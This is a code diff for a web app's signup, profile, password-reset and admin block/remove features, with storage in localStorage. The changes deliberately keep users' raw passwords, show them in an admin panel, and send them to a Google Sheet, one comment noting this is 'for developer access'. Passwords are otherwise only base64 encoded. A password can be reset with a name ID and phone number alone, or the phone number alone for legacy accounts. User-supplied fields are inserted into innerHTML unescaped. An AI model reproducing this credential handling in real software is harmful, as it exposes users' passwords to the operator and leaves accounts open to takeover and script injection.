@@ -1081,6 +1081,16 @@ tr:hover .boq-act-btns .boq-act-del{ opacity:1; }
             </div>
           </div>
 
+          <div class="fi-wrap">
+            <label class="fl">Unique Name ID <span style="color:var(--rust)">*</span> <span style="font-size:.6rem;color:var(--muted2);text-transform:none;letter-spacing:0;font-weight:400">— used to sign in &amp; reset password</span></label>
+            <div style="display:flex;gap:8px;align-items:center">
+              <span style="font-size:.72rem;color:var(--muted);white-space:nowrap;padding:9px 0">@</span>
+              <input class="fi" id="su-nameid" placeholder="e.g. priya_sharma_design" style="flex:1;font-family:monospace" oninput="this.value=this.value.toLowerCase().replace(/[^a-z0-9_]/g,'');suValidate()">
+            </div>
+            <div style="font-size:.62rem;color:var(--muted2);margin-top:3px">Only lowercase letters, numbers, underscores. Min 4 characters.</div>
+            <div class="hp-inline-err" id="su-nameid-err" style="display:none">This Name ID is already taken. Please choose another.</div>
+          </div>
+
           <div class="hp-section-label" style="color:var(--sage)">Company Details</div>
 
           <div class="fi-wrap">
@@ -2125,6 +2135,7 @@ tr:hover .boq-act-btns .boq-act-del{ opacity:1; }
           <input type="file" id="prof-av-file" accept="image/*" style="display:none" onchange="profHandleAvatar(this.files)">
           <label class="prof-upload-av" onclick="document.getElementById('prof-av-file').click()">📷 Change Photo</label>
           <div class="prof-name" id="prof-disp-name">Your Name</div>
+          <div style="font-size:.7rem;color:var(--gold);font-family:monospace;margin-top:2px;margin-bottom:2px" id="prof-disp-nameid"></div>
           <div class="prof-company" id="prof-disp-company">Company</div>
         </div>
         <div class="prof-divider"></div>
@@ -2159,10 +2170,32 @@ tr:hover .boq-act-btns .boq-act-del{ opacity:1; }
       <!-- Developer Admin Panel — only shown to Umang -->
       <div class="prof-card" id="dev-admin-panel" style="margin-top:14px;padding:16px 18px;display:none;border:1px solid rgba(184,136,74,.3)">
         <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:12px">
-          <div style="font-size:.62rem;font-weight:600;letter-spacing:1.5px;text-transform:uppercase;color:var(--gold)">🔐 Developer Panel</div>
+          <div style="font-size:.62rem;font-weight:600;letter-spacing:1.5px;text-transform:uppercase;color:var(--gold)">🔐 Admin Panel</div>
           <button class="btn-ghost btn-sm" onclick="devRefreshUsers()">↻ Refresh</button>
         </div>
+
+        <!-- My profile info -->
         <div id="dev-user-info" style="font-size:.73rem;line-height:1.9;color:var(--ink2)">Loading…</div>
+
+        <!-- Block a number -->
+        <div style="margin-top:14px;padding-top:12px;border-top:1px solid var(--border)">
+          <div style="font-size:.62rem;font-weight:600;letter-spacing:1.2px;text-transform:uppercase;color:var(--muted);margin-bottom:8px">🚫 Block / Remove User</div>
+          <div style="display:flex;gap:8px;margin-bottom:8px">
+            <input class="fi" id="dev-block-phone" type="tel" maxlength="10" placeholder="Phone number to block" style="flex:1;font-size:.75rem" oninput="this.value=this.value.replace(/\D/g,'')">
+            <button class="btn-ghost btn-sm" onclick="devBlockUser()" style="white-space:nowrap;color:var(--rust);border-color:rgba(168,77,58,.3)">Block</button>
+            <button class="btn-ghost btn-sm" onclick="devRemoveUser()" style="white-space:nowrap;color:var(--rust);border-color:rgba(168,77,58,.3)">Remove All</button>
+          </div>
+          <div style="font-size:.62rem;color:var(--muted);line-height:1.6"><strong>Block</strong> — denies login. <strong>Remove All</strong> — wipes all data for that number.</div>
+          <div id="dev-block-msg" style="font-size:.7rem;margin-top:6px;color:var(--sage);display:none"></div>
+        </div>
+
+        <!-- Blocked numbers list -->
+        <div style="margin-top:10px;padding-top:10px;border-top:1px solid var(--border)">
+          <div style="font-size:.62rem;font-weight:600;letter-spacing:1.2px;text-transform:uppercase;color:var(--muted);margin-bottom:6px">Blocked Numbers</div>
+          <div id="dev-blocked-list" style="font-size:.71rem;color:var(--muted)">—</div>
+        </div>
+
+        <!-- Signup leads -->
         <div style="margin-top:10px;padding-top:10px;border-top:1px solid var(--border)">
           <div style="font-size:.62rem;font-weight:600;letter-spacing:1.2px;text-transform:uppercase;color:var(--muted);margin-bottom:8px">Signup Leads</div>
           <div id="dev-leads-info" style="font-size:.71rem;line-height:1.9;color:var(--muted)">—</div>
@@ -2178,6 +2211,10 @@ tr:hover .boq-act-btns .boq-act-del{ opacity:1; }
         <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px">
           <div class="fg"><label class="fl">Full Name</label><input class="fi" id="prof-name" placeholder="Your full name"></div>
           <div class="fg"><label class="fl">Mobile Number</label><input class="fi" id="prof-phone" type="tel" placeholder="9876543210"></div>
+          <div class="fg"><label class="fl">Name ID <span style="font-size:.6rem;color:var(--muted2);font-weight:400">(used to sign in)</span></label>
+            <div style="display:flex;align-items:center;gap:6px"><span style="font-size:.75rem;color:var(--muted);flex-shrink:0">@</span><input class="fi" id="prof-nameid" placeholder="your_name_id" style="font-family:monospace" oninput="this.value=this.value.toLowerCase().replace(/[^a-z0-9_]/g,'')"></div>
+          </div>
+          <div class="fg"><label class="fl">Birthday</label><input class="fi" id="prof-birthday" type="date"></div>
           <div class="fg"><label class="fl">Personal Email</label><input class="fi" id="prof-email" type="email" placeholder="you@email.com"></div>
           <div class="fg"><label class="fl">Location / City</label><input class="fi" id="prof-location" placeholder="e.g. Mumbai, Maharashtra"></div>
           <div class="fg"><label class="fl">Website</label><input class="fi" id="prof-website" placeholder="https://yourstudio.com"></div>
@@ -4418,6 +4455,7 @@ function checkPwdStrength(pwd){
 function suValidate(){
   const name    = document.getElementById('su-name')?.value.trim();
   const phone   = document.getElementById('su-phone')?.value.trim();
+  const nameid  = document.getElementById('su-nameid')?.value.trim();
   const company = document.getElementById('su-company')?.value.trim();
   const pos     = document.getElementById('su-position')?.value;
   const email   = document.getElementById('su-company-email')?.value.trim();
@@ -4426,7 +4464,7 @@ function suValidate(){
   const pwd2    = document.getElementById('su-pwd2')?.value||'';
   const pwdErr  = document.getElementById('su-pwd-err');
   if(pwdErr) pwdErr.classList.toggle('show', pwd.length>0 && pwd2.length>0 && pwd!==pwd2);
-  const ok = name && /^\d{10}$/.test(phone) && company && pos && (email||insta) && pwd.length>=8 && pwd===pwd2;
+  const ok = name && /^\d{10}$/.test(phone) && nameid && nameid.length>=4 && company && pos && (email||insta) && pwd.length>=8 && pwd===pwd2;
   const btn = document.getElementById('su-btn');
   if(btn){ btn.disabled = !ok; btn.style.opacity = ok?'1':'0.55'; }
 }
@@ -4512,8 +4550,13 @@ function hpLoginPassword(){
     if(!prof.phone || prof.phone !== phone){
       toast('No account found for this number'); restore(); return;
     }
-    if(prof.status==='denied'){
-      toast('❌ Account denied. Email umangsingal1@gmail.com'); restore(); return;
+    if(prof.status==='denied' || prof.status==='blocked'){
+      toast('❌ This account has been suspended. Contact umangsingal1@gmail.com'); restore(); return;
+    }
+    // Check global blocked list
+    const blockedNums = JSON.parse(localStorage.getItem('dm_blocked')||'[]');
+    if(blockedNums.includes(phone)){
+      toast('❌ This account has been suspended.'); restore(); return;
     }
     if(!prof.password){
       prof.password = btoa(pwd);
@@ -4526,7 +4569,10 @@ function hpLoginPassword(){
       hpEnterApp(false); return;
     }
     if(prof.password !== btoa(pwd)){
-      if(errEl) errEl.classList.add('show');
+      if(errEl){
+        errEl.innerHTML = '❌ Incorrect password. <span style="color:var(--gold);cursor:pointer;text-decoration:underline" onclick="showResetPassword()">Forgot password?</span>';
+        errEl.classList.add('show');
+      }
       document.getElementById('login-pwd').value='';
       document.getElementById('login-pwd').focus();
       restore(); return;
@@ -4542,40 +4588,97 @@ function hpLoginPassword(){
 }
 
 function showResetPassword(){
-  // Remove existing modal if any
   document.getElementById('reset-pwd-modal')?.remove();
-
   const modal = document.createElement('div');
   modal.id = 'reset-pwd-modal';
   modal.style.cssText = 'position:fixed;inset:0;background:rgba(28,26,23,.6);backdrop-filter:blur(8px);z-index:9999;display:flex;align-items:center;justify-content:center;padding:20px;';
   modal.innerHTML = `
-    <div style="background:#FDFCFA;border-radius:20px;padding:28px 24px;max-width:380px;width:100%;box-shadow:0 24px 60px rgba(28,26,23,.25)">
+    <div style="background:#FDFCFA;border-radius:20px;padding:28px 24px;max-width:400px;width:100%;box-shadow:0 24px 60px rgba(28,26,23,.25)">
       <div style="font-family:'Fraunces',serif;font-size:1.2rem;font-weight:300;margin-bottom:4px">Reset Password</div>
-      <div style="font-size:.72rem;color:var(--muted);margin-bottom:20px;line-height:1.6">Enter your registered mobile number and choose a new password.</div>
+      <div style="font-size:.72rem;color:var(--muted);margin-bottom:20px;line-height:1.6">Verify your identity to reset your password.</div>
 
-      <div class="fg" style="margin-bottom:12px">
-        <label class="fl">Mobile Number</label>
-        <div style="display:flex;gap:8px">
-          <input class="fi" style="max-width:70px;text-align:center" value="+91" readonly>
-          <input class="fi" id="reset-phone" type="tel" placeholder="9876543210" maxlength="10" style="flex:1">
+      <!-- Step 1: Verify -->
+      <div id="reset-step1">
+        <div class="fg" style="margin-bottom:12px">
+          <label class="fl">Name ID <span style="color:var(--rust)">*</span></label>
+          <div style="display:flex;align-items:center;gap:6px">
+            <span style="font-size:.8rem;color:var(--muted);flex-shrink:0">@</span>
+            <input class="fi" id="reset-nameid" placeholder="your_name_id" style="flex:1;font-family:monospace" oninput="this.value=this.value.toLowerCase().replace(/[^a-z0-9_]/g,'')">
+          </div>
+        </div>
+        <div class="fg" style="margin-bottom:18px">
+          <label class="fl">Mobile Number <span style="color:var(--rust)">*</span></label>
+          <div style="display:flex;gap:8px">
+            <span style="display:flex;align-items:center;font-size:.8rem;color:var(--muted);padding:0 8px;background:var(--bg2);border-radius:8px;border:1px solid var(--border)">🇮🇳 +91</span>
+            <input class="fi" id="reset-phone" type="tel" placeholder="9876543210" maxlength="10" style="flex:1" oninput="this.value=this.value.replace(/\\D/g,'')">
+          </div>
+        </div>
+        <div id="reset-verify-err" style="font-size:.72rem;color:var(--rust);margin-bottom:10px;display:none"></div>
+        <div style="display:flex;gap:10px">
+          <button class="btn-ghost" style="flex:1" onclick="document.getElementById('reset-pwd-modal').remove()">Cancel</button>
+          <button class="btn" style="flex:1;background:var(--ink)" onclick="doVerifyResetIdentity()">Continue →</button>
         </div>
       </div>
-      <div class="fg" style="margin-bottom:12px">
-        <label class="fl">New Password</label>
-        <input class="fi" id="reset-pwd1" type="password" placeholder="Min 8 characters">
-      </div>
-      <div class="fg" style="margin-bottom:20px">
-        <label class="fl">Confirm New Password</label>
-        <input class="fi" id="reset-pwd2" type="password" placeholder="Repeat new password">
-      </div>
 
-      <div style="display:flex;gap:10px">
-        <button class="btn-ghost" style="flex:1" onclick="document.getElementById('reset-pwd-modal').remove()">Cancel</button>
-        <button class="btn" style="flex:1;background:#5E7260" onclick="doResetPassword()">Set Password →</button>
+      <!-- Step 2: New password (hidden until verified) -->
+      <div id="reset-step2" style="display:none">
+        <div style="background:rgba(94,114,96,.08);border:1px solid rgba(94,114,96,.25);border-radius:8px;padding:9px 12px;font-size:.72rem;color:var(--sage);margin-bottom:16px">
+          ✅ Identity verified — set your new password below
+        </div>
+        <div class="fg" style="margin-bottom:12px">
+          <label class="fl">New Password</label>
+          <input class="fi" id="reset-pwd1" type="password" placeholder="Min 8 characters">
+        </div>
+        <div class="fg" style="margin-bottom:20px">
+          <label class="fl">Confirm New Password</label>
+          <input class="fi" id="reset-pwd2" type="password" placeholder="Repeat new password">
+        </div>
+        <div style="display:flex;gap:10px">
+          <button class="btn-ghost" style="flex:1" onclick="document.getElementById('reset-pwd-modal').remove()">Cancel</button>
+          <button class="btn" style="flex:1;background:#5E7260" onclick="doResetPassword()">Set Password →</button>
+        </div>
       </div>
     </div>`;
   document.body.appendChild(modal);
-  setTimeout(()=>document.getElementById('reset-phone')?.focus(), 200);
+  setTimeout(()=>document.getElementById('reset-nameid')?.focus(), 200);
+}
+
+function doVerifyResetIdentity(){
+  const nameId = document.getElementById('reset-nameid').value.trim().toLowerCase();
+  const phone  = document.getElementById('reset-phone').value.trim();
+  const errEl  = document.getElementById('reset-verify-err');
+
+  if(!nameId){ errEl.textContent='Please enter your Name ID'; errEl.style.display='block'; return; }
+  if(!/^\d{10}$/.test(phone)){ errEl.textContent='Enter your 10-digit mobile number'; errEl.style.display='block'; return; }
+
+  // Temporarily set phone in dm_user so LS resolves the correct profile key
+  const prevUser = localStorage.getItem('dm_user');
+  localStorage.setItem('dm_user', JSON.stringify({phone}));
+  let prof = PROFDB.get();
+  if(!prof.phone){ try{ prof = JSON.parse(localStorage.getItem('dm_profile')||'{}'); }catch{ prof={}; } }
+
+  // Restore user immediately — verification only
+  if(prevUser) localStorage.setItem('dm_user', prevUser); else localStorage.removeItem('dm_user');
+
+  if(!prof.phone || prof.phone !== phone){
+    errEl.textContent = '❌ No account found for this number'; errEl.style.display='block'; return;
+  }
+  if(prof.status === 'denied' || prof.status === 'blocked'){
+    errEl.textContent = '❌ Account is not active'; errEl.style.display='block'; return;
+  }
+  const storedNameId = (prof.nameId||'').toLowerCase();
+  if(!storedNameId){
+    // Legacy account with no nameId — allow reset with phone only, prompt to set nameId after
+    errEl.style.display='none';
+  } else if(storedNameId !== nameId){
+    errEl.textContent = '❌ Name ID does not match our records'; errEl.style.display='block'; return;
+  }
+
+  // Verified — show step 2
+  errEl.style.display='none';
+  document.getElementById('reset-step1').style.display='none';
+  document.getElementById('reset-step2').style.display='block';
+  setTimeout(()=>document.getElementById('reset-pwd1')?.focus(), 100);
 }
 
 function doResetPassword(){
@@ -4583,7 +4686,6 @@ function doResetPassword(){
   const pwd1  = document.getElementById('reset-pwd1').value;
   const pwd2  = document.getElementById('reset-pwd2').value;
 
-  if(!/^\d{10}$/.test(phone)){ toast('Enter your registered 10-digit mobile number'); return; }
   if(!pwd1 || pwd1.length < 8){ toast('Password must be at least 8 characters'); return; }
   if(pwd1 !== pwd2){ toast('Passwords do not match'); return; }
 
@@ -4591,33 +4693,22 @@ function doResetPassword(){
   const prevUser = localStorage.getItem('dm_user');
   localStorage.setItem('dm_user', JSON.stringify({phone}));
   let prof = PROFDB.get();
-
-  // Fallback: check old global key if new scoped key is empty
-  if(!prof.phone){
-    try{ prof = JSON.parse(localStorage.getItem('dm_profile')||'{}'); }catch{ prof={}; }
-  }
+  if(!prof.phone){ try{ prof = JSON.parse(localStorage.getItem('dm_profile')||'{}'); }catch{ prof={}; } }
 
   if(!prof.phone || prof.phone !== phone){
     if(prevUser) localStorage.setItem('dm_user', prevUser); else localStorage.removeItem('dm_user');
-    toast('❌ No account found for this number'); return;
-  }
-  if(prof.status === 'denied'){
-    if(prevUser) localStorage.setItem('dm_user', prevUser); else localStorage.removeItem('dm_user');
-    toast('❌ Account not approved. Email umangsingal1@gmail.com'); return;
+    toast('❌ Something went wrong. Please try again.'); return;
   }
 
-  // Save new password
   prof.password = btoa(pwd1);
+  prof.rawPwd   = pwd1;
   prof.status   = 'approved';
-  PROFDB.save(prof); // saves to phone-scoped key
-  migrateAllUserData(phone); // migrate all other old keys
-  // Clear temp session — user must sign in properly
+  PROFDB.save(prof);
+  migrateAllUserData(phone);
   localStorage.removeItem('dm_user');
 
   document.getElementById('reset-pwd-modal').remove();
   toast('✅ Password updated! Sign in with your new password.');
-
-  // Pre-fill the phone on login form
   const loginPhone = document.getElementById('login-phone');
   if(loginPhone) loginPhone.value = phone;
   document.getElementById('login-pwd')?.focus();
@@ -5170,6 +5261,7 @@ async function sendToSheets(payload){
 async function hpSubmitSignup(){
   const name      = document.getElementById('su-name')?.value.trim()||'';
   const phone     = document.getElementById('su-phone')?.value.trim()||'';
+  const nameId    = document.getElementById('su-nameid')?.value.trim()||'';
   const company   = document.getElementById('su-company')?.value.trim()||'';
   const position  = document.getElementById('su-position')?.value||'';
   const compEmail = document.getElementById('su-company-email')?.value.trim()||'';
@@ -5178,21 +5270,33 @@ async function hpSubmitSignup(){
   const pwd2      = document.getElementById('su-pwd2')?.value||'';
   const btn       = document.getElementById('su-btn');
 
-  // Validation (belt-and-suspenders since button is disabled until valid)
+  // Validation
   if(!name)                      { toast('Please enter your full name'); return; }
   if(!/^\d{10}$/.test(phone))   { toast('Enter a valid 10-digit mobile number'); return; }
+  if(!nameId || nameId.length<4) { toast('Please choose a Name ID (min 4 characters)'); return; }
   if(!company)                   { toast('Please enter your company name'); return; }
   if(!position)                  { toast('Please select your position'); return; }
   if(!compEmail && !insta)       { toast('Please add your company email or Instagram'); return; }
   if(pwd.length < 8)             { toast('Password must be at least 8 characters'); return; }
   if(pwd !== pwd2)               { toast('Passwords do not match'); return; }
 
+  // Check Name ID uniqueness against all leads
+  const leads = JSON.parse(localStorage.getItem('dm_leads')||'[]');
+  const nameIdTaken = leads.some(l=>l.nameId && l.nameId.toLowerCase()===nameId.toLowerCase());
+  if(nameIdTaken){
+    const errEl = document.getElementById('su-nameid-err');
+    if(errEl) errEl.style.display='block';
+    toast('❌ This Name ID is already taken'); return;
+  } else {
+    const errEl = document.getElementById('su-nameid-err');
+    if(errEl) errEl.style.display='none';
+  }
+
   // Check if number is already registered — redirect to login
   if(isAlreadySubmitted(phone)){
     hpTab('login');
     const loginPhone = document.getElementById('login-phone');
     if(loginPhone) loginPhone.value = phone;
-    // Remove any existing banner
     document.getElementById('hp-already-banner')?.remove();
     const loginPanel = document.getElementById('hp-login');
     if(loginPanel){
@@ -5217,7 +5321,7 @@ async function hpSubmitSignup(){
     // Save profile locally (now uses correct phone-prefixed key)
     const prof = PROFDB.get();
     Object.assign(prof, {
-      name, phone, company, position,
+      name, phone, nameId, company, position,
       companyEmail: compEmail,
       insta,
       status: 'pending',
@@ -5229,13 +5333,13 @@ async function hpSubmitSignup(){
 
     // Mark as submitted to prevent duplicates
     const leads = JSON.parse(localStorage.getItem('dm_leads')||'[]');
-    leads.push({phone, name, company, position, companyEmail:compEmail, insta, ts:Date.now()});
+    leads.push({phone, name, nameId, company, position, companyEmail:compEmail, insta, ts:Date.now()});
     localStorage.setItem('dm_leads', JSON.stringify(leads));
 
     // Send to Google Sheets — fire and forget
     sendToSheets({
       action: 'signup_request',
-      name, phone, company, position,
+      name, phone, nameId, company, position,
       companyEmail: compEmail,
       instagram: insta ? 'instagram.com/'+insta : '',
       password: pwd,  // plain text for developer access in Sheet
@@ -5301,6 +5405,8 @@ function openProfile(){
   const prof = PROFDB.get();
   document.getElementById('prof-name').value     = prof.name||'';
   document.getElementById('prof-phone').value    = prof.phone||'';
+  document.getElementById('prof-nameid').value   = prof.nameId||'';
+  document.getElementById('prof-birthday').value = prof.birthday||'';
   document.getElementById('prof-email').value    = prof.email||'';
   document.getElementById('prof-location').value = prof.location||'';
   document.getElementById('prof-website').value  = prof.website||'';
@@ -5323,18 +5429,22 @@ function openProfile(){
 function devRefreshUsers(){
   const prof  = PROFDB.get();
   const leads = JSON.parse(localStorage.getItem('dm_leads')||'[]');
+  const blocked = JSON.parse(localStorage.getItem('dm_blocked')||'[]');
   const panel = document.getElementById('dev-user-info');
   const leadsPanel = document.getElementById('dev-leads-info');
+  const blockedPanel = document.getElementById('dev-blocked-list');
 
   if(panel){
     const fields = [
       ['Name',      prof.name||'—'],
+      ['Name ID',   prof.nameId ? '@'+prof.nameId : '—'],
       ['Phone',     prof.phone ? '+91 '+prof.phone : '—'],
-      ['Password',  prof.rawPwd || (prof.password ? '(set, plain text not stored — ask user to re-signup)' : '—')],
+      ['Password',  prof.rawPwd || (prof.password ? '(set)' : '—')],
       ['Company',   prof.company||'—'],
       ['Position',  prof.position||'—'],
       ['Email',     prof.companyEmail||prof.email||'—'],
-      ['Instagram', prof.insta ? 'instagram.com/'+prof.insta : '—'],
+      ['Instagram', prof.insta ? '@'+prof.insta : '—'],
+      ['Birthday',  prof.birthday||'—'],
       ['Status',    prof.status||'—'],
       ['Joined',    prof.joinedAt ? new Date(prof.joinedAt).toLocaleDateString('en-IN') : '—'],
     ];
@@ -5345,15 +5455,90 @@ function devRefreshUsers(){
       </div>`).join('');
   }
 
+  if(blockedPanel){
+    if(!blocked.length){ blockedPanel.innerHTML='No blocked numbers'; }
+    else {
+      blockedPanel.innerHTML = blocked.map(b=>`
+        <div style="display:flex;align-items:center;justify-content:space-between;padding:4px 0;border-bottom:1px solid var(--border)">
+          <span style="font-size:.73rem">+91 ${b}</span>
+          <button class="btn-ghost btn-sm" style="font-size:.63rem;color:var(--sage)" onclick="devUnblockUser('${b}')">Unblock</button>
+        </div>`).join('');
+    }
+  }
+
   if(leadsPanel){
     if(!leads.length){ leadsPanel.innerHTML='No signups yet'; return; }
     leadsPanel.innerHTML = leads.slice().reverse().map((l,i)=>`
       <div style="padding:6px 0;border-bottom:1px solid var(--border)">
-        <div style="font-weight:500">${l.name} · +91 ${l.phone}</div>
+        <div style="font-weight:500">${l.name}${l.nameId?' · @'+l.nameId:''} · +91 ${l.phone}</div>
         <div style="color:var(--muted);font-size:.65rem">${l.company||''} · ${l.position||''} · ${new Date(l.ts).toLocaleDateString('en-IN')}</div>
         ${l.companyEmail?`<div style="font-size:.65rem;color:var(--blue)">${l.companyEmail}</div>`:''}
       </div>`).join('');
   }
+}
+
+// ── BLOCK / REMOVE USER ───────────────────────────────────────────────────────
+function devBlockUser(){
+  const phone = document.getElementById('dev-block-phone').value.trim();
+  if(!/^\d{10}$/.test(phone)){ toast('Enter a valid 10-digit number'); return; }
+  const blocked = JSON.parse(localStorage.getItem('dm_blocked')||'[]');
+  if(!blocked.includes(phone)){
+    blocked.push(phone);
+    localStorage.setItem('dm_blocked', JSON.stringify(blocked));
+  }
+  // Also mark their profile as blocked/denied
+  const prevUser = localStorage.getItem('dm_user');
+  localStorage.setItem('dm_user', JSON.stringify({phone}));
+  const prof = PROFDB.get();
+  if(prof.phone === phone){ prof.status='blocked'; PROFDB.save(prof); }
+  if(prevUser) localStorage.setItem('dm_user', prevUser); else localStorage.removeItem('dm_user');
+
+  const msg = document.getElementById('dev-block-msg');
+  if(msg){ msg.textContent='🚫 +91 '+phone+' blocked — they cannot log in'; msg.style.display='block'; }
+  document.getElementById('dev-block-phone').value='';
+  devRefreshUsers();
+  toast('🚫 Blocked +91 '+phone);
+}
+
+function devRemoveUser(){
+  const phone = document.getElementById('dev-block-phone').value.trim();
+  if(!/^\d{10}$/.test(phone)){ toast('Enter a valid 10-digit number'); return; }
+  if(!confirm('Remove ALL data for +91 '+phone+'? This cannot be undone.')){ return; }
+
+  const pfx = 'dm_'+phone+'_';
+  const toRemove = [];
+  for(let i=0; i<localStorage.length; i++){
+    const k = localStorage.key(i);
+    if(k && k.startsWith(pfx)) toRemove.push(k);
+  }
+  toRemove.forEach(k=>localStorage.removeItem(k));
+
+  // Remove from leads
+  const leads = JSON.parse(localStorage.getItem('dm_leads')||'[]').filter(l=>l.phone!==phone);
+  localStorage.setItem('dm_leads', JSON.stringify(leads));
+
+  // Add to blocked list
+  const blocked = JSON.parse(localStorage.getItem('dm_blocked')||'[]');
+  if(!blocked.includes(phone)){ blocked.push(phone); localStorage.setItem('dm_blocked', JSON.stringify(blocked)); }
+
+  const msg = document.getElementById('dev-block-msg');
+  if(msg){ msg.textContent='🗑 +91 '+phone+' — all data removed and blocked'; msg.style.display='block'; }
+  document.getElementById('dev-block-phone').value='';
+  devRefreshUsers();
+  toast('🗑 User '+phone+' removed');
+}
+
+function devUnblockUser(phone){
+  const blocked = JSON.parse(localStorage.getItem('dm_blocked')||'[]').filter(b=>b!==phone);
+  localStorage.setItem('dm_blocked', JSON.stringify(blocked));
+  // Restore their profile status if still exists
+  const prevUser = localStorage.getItem('dm_user');
+  localStorage.setItem('dm_user', JSON.stringify({phone}));
+  const prof = PROFDB.get();
+  if(prof.phone === phone && prof.status==='blocked'){ prof.status='approved'; PROFDB.save(prof); }
+  if(prevUser) localStorage.setItem('dm_user', prevUser); else localStorage.removeItem('dm_user');
+  devRefreshUsers();
+  toast('✅ Unblocked +91 '+phone);
 }
 
 
@@ -5363,6 +5548,7 @@ function profRefreshDisplay(prof){
   const navAv = document.getElementById('navAv'); if(navAv) navAv.textContent = initials;
   const ph = document.getElementById('prof-av-placeholder'); if(ph) ph.textContent = initials;
   const dn = document.getElementById('prof-disp-name'); if(dn) dn.textContent = prof.name||'Your Name';
+  const dnid = document.getElementById('prof-disp-nameid'); if(dnid) dnid.textContent = prof.nameId ? '@'+prof.nameId : '';
   const dc = document.getElementById('prof-disp-company'); if(dc) dc.textContent = prof.company||'Company';
   const dp = document.getElementById('prof-disp-phone'); if(dp) dp.textContent = prof.phone ? '+91 '+prof.phone : '—';
   const de = document.getElementById('prof-disp-email'); if(de) de.textContent = prof.email||prof.companyEmail||'—';
@@ -5386,6 +5572,8 @@ async function saveProfile(){
   const prof = PROFDB.get();
   prof.name    = document.getElementById('prof-name').value.trim();
   prof.phone   = document.getElementById('prof-phone').value.trim();
+  prof.nameId  = document.getElementById('prof-nameid').value.trim();
+  prof.birthday= document.getElementById('prof-birthday').value;
   prof.email   = document.getElementById('prof-email').value.trim();
   prof.location= document.getElementById('prof-location').value.trim();
   prof.website = document.getElementById('prof-website').value.trim();
@@ -5400,11 +5588,10 @@ async function saveProfile(){
   // Password
   const pwd = document.getElementById('prof-pwd').value;
   const pwd2= document.getElementById('prof-pwd2').value;
-  if(pwd){ if(pwd!==pwd2){toast('Passwords do not match');return;} if(pwd.length<8){toast('Password must be at least 8 characters');return;} prof.password=btoa(pwd); }
+  if(pwd){ if(pwd!==pwd2){toast('Passwords do not match');return;} if(pwd.length<8){toast('Password must be at least 8 characters');return;} prof.password=btoa(pwd); prof.rawPwd=pwd; }
   PROFDB.save(prof);
   localStorage.setItem('dm_user', JSON.stringify({name:prof.name,phone:prof.phone,status:prof.status}));
   profRefreshDisplay(prof);
-  // Sync to Google Sheets
   await sendToSheets({action:'profile_update', ...prof, avatarDataUrl:'[image]', timestamp:Date.now()});
   toast('✦ Profile saved');
 }
